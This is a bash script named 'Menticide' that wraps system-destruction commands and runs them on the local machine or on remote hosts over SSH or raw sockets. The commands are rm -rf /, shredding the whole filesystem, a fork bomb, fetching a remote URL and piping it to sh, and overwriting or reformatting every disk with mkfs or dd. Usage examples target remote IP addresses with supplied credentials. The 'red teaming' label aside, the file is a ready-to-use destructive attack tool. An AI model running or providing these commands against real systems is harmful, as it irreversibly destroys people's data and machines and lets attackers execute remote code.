#!/bin/bash
#
# Regards, the Alveare Solutions #!/Society -x
#
# Menticide (A killing of the mind)

declare -A CARGO

SCRIPT_NAME='Menticide'
VERSION='1.0KOTM'
MENTICIDE_METHODS=(
    'screw-root' 'shred-root' 'fork-bomb' 'down-exec' 'format-out' 'zero-out'
    'rand-out'
)
MENTICIDE_METHOD="${1:-screw-root}"
OPERATING_SYSTEM="${2:-Linux}"      # (Linux only... for now)
TARGET_SYSTEM="${3:-local}"         # (local | remote)
REMOTE_PROTO="${4:-ssh}"            # (ssh | raw)
REMOTE_ADDR="${5:-127.0.0.1}"
REMOTE_PORT="${6:-22}"
REMOTE_USER="${7}"
REMOTE_PASS="${8}"
REMOTE_URL="${9}"
CARGO=(
['ssh-cmd']='ssh-command.sh'
['raw-cmd']='raw-command.sh'
)

# CHECKERS

function check_preconditions() {
    local FAILURE_COUNT=0
    if [ -z "$MENTICIDE_METHOD" ] || [[ "$MENTICIDE_METHOD" == '-' ]]; then
        local FAILURE_COUNT=$((FAILURE_COUNT + 1))
        echo "[ ERROR ]: No menticide method specified!"
    else
        while :; do
            for action_label in ${MENTICIDE_METHODS[@]}; do
                if [[ "${MENTICIDE_METHOD}" == "${action_label}" ]]; then
                    break 2
                fi
            done
            local FAILURE_COUNT=$((FAILURE_COUNT + 1))
            echo "[ ERROR ]: Invalid menticide method specified! (${MENTICIDE_METHOD})"
            break
        done
    fi
    if [[ "${MENTICIDE_METHOD}" == 'down-exec' ]] && [ -z "$REMOTE_URL" ]; then
        local FAILURE_COUNT=$((FAILURE_COUNT + 1))
        echo "[ ERROR ]: Now remote URL specified for action! (${MENTICIDE_METHOD} - ${REMOTE_URL})"
    fi
    return $FAILURE_COUNT
}

# DISPLAY

function display_header() {
     cat <<EOF
    ___________________________________________________________________________

     *                         *      ${SCRIPT_NAME}      *                       *
    _____________________________________________________v.${VERSION}_____________
                    Regards, the Alveare Solutions #!/Society -x
EOF
    return $?
}

function display_usage() {
    display_header
    cat <<EOF

  [ DESCRIPTION ]: A killing of the mind - wrapper for all the ways to destroy
      a system, and another Cargo script for your red teaming frameworks!

  [ NOTE        ]: Available actions:
      * screw-root  - rm -rf /
      * shred-root  - find / | xargs shred --force --remove=wipesync
      * fork-bomb   - :(){ :|: & };: –
      * down-exec   - wget http://example.com/something -O - | sh -
      * format-out  - for disk in \`lsblk -pr | grep /dev | awk '{print \$1}'\`; \\
                      do mkfs.ext4 \${disk} ; done
      * zero-out    - for disk in \`lsblk -pr | grep /dev | awk '{print \$1}'\`; \\
                      do dd if=/dev/zero of=\${disk} status=progress; done
      * rand-out    - for disk in \`lsblk -pr | grep /dev | awk '{print \$1}'\`; \\
                      do dd if=/dev/random of=\${disk} status=progress; done

  [ EXAMPLE     ]: How 2 Menticide -

    [ EX1 ]: The local machine:
        $ ./`basename $0` screw-root

    [ EX2 ]: A remote machine using SSH:
        $ ./`basename $0` zero-out Linux remote ssh 192.168.100.23 22 User1 MyPass

    [ EX3 ]: A remote machine using RAW sockets:
        $ ./`basename $0` fork-bomb Linux remote raw 192.168.100.23 8080

    [ EX4 ]: Download script and execute on remote machine using RAW sockets:
        $ ./`basename $0` down-exec Linux remote raw 192.168.100.23 8080 - - http://example.com/something

    [ EX5 ]: Multi-method action:
        $ ./`basename $0` down-exec,shred-root,zero-out,fork-bomb

  [ USAGE       ]: Positional args only - quite a primitive thing going on... -
        $ ./`basename $0` <action-csv> <OS> <target> <protocol> <remote-address> \\
                <remote-port> <remote-user> <remote-pass> <down-exec-url>

EOF
    return $?
}

# FORMATTERS

function format_shred_root_command() {
    local COMMAND="find / | xargs shred --force --remove=wipesync"
    echo "${COMMAND}"
    return $?
}

function format_fork_bomb_command() {
    local COMMAND=":(){ :|: & };: –"
    echo "${COMMAND}"
    return $?
}

function format_down_exec_command() {
    local COMMAND="wget ${REMOTE_URL} -O - | sh -"
    echo "${COMMAND}"
    return $?
}

function format_format_out_command() {
    local COMMAND="for disk in \`lsblk -pr | grep /dev | awk '{print \$1}'\`; do mkfs.ext4 \${disk}; done"
    echo "${COMMAND}"
    return $?
}

function format_zero_out_command() {
    local COMMAND="for disk in \`lsblk -pr | grep /dev | awk '{print \$1}'\`; do dd if=/dev/zero of=\${disk} status=progress; done"
    echo "${COMMAND}"
    return $?
}

function format_rand_out_command() {
    local COMMAND="for disk in \`lsblk -pr | grep /dev | awk '{print \$1}'\`; do dd if=/dev/random of=\${disk} status=progress; done"
    echo "${COMMAND}"
    return $?
}

function format_screw_root_command() {
    local COMMAND="rm -rf /"
    echo "${COMMAND}"
    return $?
}

function format_ssh_args() {
    local COMMAND="$@"
    local ARGUMENTS=(
        "${REMOTE_USER}"
        "${REMOTE_ADDR}"
        "${REMOTE_PORT}"
        "${REMOTE_PASS}"
        "${COMMAND}"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

function format_raw_args() {
    local COMMAND="$@"
    local ARGUMENTS=(
        "--target-address=${REMOTE_ADDR}"
        "--port-number=${REMOTE_PORT}"
        "--message='${COMMAND}'"
    )
    echo ${ARGUMENTS[@]}
    return $?
}

# ACTIONS

function action_exec() {
    local COMMAND="$@"
    local EXIT_CODE=1
    case "${REMOTE_PROTO}" in
        'ssh')
            ${CARGO['ssh-cmd']} `format_ssh_args $COMMAND`
            local EXIT_CODE=$?
            ;;
        'raw')
            ${CARGO['raw-cmd']} `format_raw_args $COMMAND`
            local EXIT_CODE=$?
            ;;
        *)
            echo "[ ERROR ]: Invalid remote protocol! (${REMOTE_PROTO})"
            ;;
    esac
    return ${EXIT_CODE}
}

# GENERAL

function start_menticide() {
    local EXIT_CODE=0
    for action in `echo ${MENTICIDE_METHOD} | tr ',' ' '`; do
        case "${action}" in
            'screw-root')
                action_exec `format_screw_root_command`
                ;;
            'shred-root')
                action_exec `format_shred_root_command`
                ;;
            'fork-bomb')
                action_exec `format_fork_bomb_command`
                ;;
            'down-exec')
                action_exec `format_down_exec_command`
                ;;
            'format-out')
                action_exec `format_format_out_command`
                ;;
            'zero-out')
                action_exec `format_zero_out_command`
                ;;
            'rand-out')
                action_exec `format_rand_out_command`
                ;;
            *)
                local EXIT_CODE=1
                ;;
        esac
    done
    return ${EXIT_CODE}
}

# INIT

function init_menticide() {
    check_preconditions
    if [ $? -ne 0 ]; then
        display_usage $@
        return 1
    fi
    start_menticide
    return $?
}

# MISCELLANEOUS

if [[ "$1" == '-h' ]] || [[ "$1" == '--help' ]]; then
    display_usage $@
    exit 0
fi

init_menticide $@
exit $?
